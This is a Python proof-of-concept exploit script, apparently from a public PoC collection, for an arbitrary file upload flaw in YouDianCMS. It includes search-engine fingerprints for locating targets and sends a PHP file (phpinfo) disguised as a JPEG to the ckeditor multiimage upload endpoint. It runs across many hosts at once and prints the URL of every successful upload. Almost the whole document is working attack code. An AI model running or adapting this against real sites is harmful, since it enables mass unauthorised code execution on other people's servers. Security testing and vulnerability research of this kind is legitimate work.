#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa：icon_hash="-1629133697"
# zoomeye:iconhash: "40d924d96b8903a41252bc0a8eb3f39b"

import ssl
import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()
if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 YouDianCMS_image_upload_Upload_File_Poc.py url.txt                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
}  
def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data; boundary=cadc403efc1ad12f5fcce44c172baad2",
        "Host": "%s" %host2
    }
    data ="""--cadc403efc1ad12f5fcce44c172baad2
Content-Disposition: form-data; name="files"; filename="c.php"
Content-Type: image/jpg

<?php phpinfo();?>
--cadc403efc1ad12f5fcce44c172baad2--
"""
    vulurl = url + "/Public/ckeditor/plugins/multiimage/dialogs/image_upload.php"
    try:
        r = requests.post(vulurl, headers=headers,data=data,verify=False)
        if  "imgurl" in r.text:
            json_dict=r.json()
            print(url+"/Public/"+json_dict["imgurl"])
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])